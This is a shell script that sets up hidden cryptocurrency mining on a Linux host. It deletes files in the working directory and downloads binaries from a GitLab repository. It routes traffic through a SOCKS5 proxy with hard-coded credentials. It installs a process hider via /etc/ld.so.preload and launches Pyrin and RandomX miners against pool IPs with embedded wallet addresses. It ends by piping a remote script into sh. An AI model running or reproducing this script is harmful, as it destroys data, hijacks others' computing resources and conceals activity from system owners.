rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81

chmod 777 lol1.81

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 209.97.145.189:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 138.197.98.18:80 -u pyrin:qp3dslwvrkxf3qhj6gym52wtadqdqcf39q7y94zmreqyetrwes3r2um5ed0sw.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
chmod 777 b && ./b -o 161.35.141.255:80 -u amyKu3rFXP6GQ5mucGXAKZGku6S49ZcD9BC7T5ZftyyCihDFDkv1e8L62qsuzgG3RZ79TZ8wzBN5CbtAfi3JCRVA2DETfs2R5j -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1 -t2 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh